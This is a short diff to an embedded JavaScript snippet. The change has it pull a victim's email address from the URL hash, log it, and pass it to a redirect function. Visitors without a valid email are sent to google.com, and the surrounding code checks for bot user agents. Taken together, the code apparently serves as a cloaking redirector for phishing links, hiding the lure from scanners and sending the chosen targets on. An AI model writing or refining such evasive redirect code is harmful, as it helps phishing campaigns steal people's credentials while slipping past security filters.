@@ -1,8 +1,9 @@
+<script>
 (function () {
-  function getEmailFromPath() {
-    const pathSegments = window.location.pathname.split("/");
-    const emailCandidate = pathSegments[pathSegments.length - 1];
-    return decodeURIComponent(emailCandidate);
+  function getEmailFromHash() {
+    const hash = window.location.hash;
+    if (!hash) return null;
+    return decodeURIComponent(hash.replace("#", ""));
   }
 
   function isBotUserAgent() {
@@ -36,7 +37,9 @@
       return;
     }
 
-    const email = getEmailFromPath();
+    const email = getEmailFromHash();
+    console.log("Extracted email:", email);
+
     if (!email || !email.includes("@")) {
       window.location.href = "https://google.com";
       return;
@@ -45,3 +48,4 @@
     redirectUser(email);
   });
 })();
+</script>
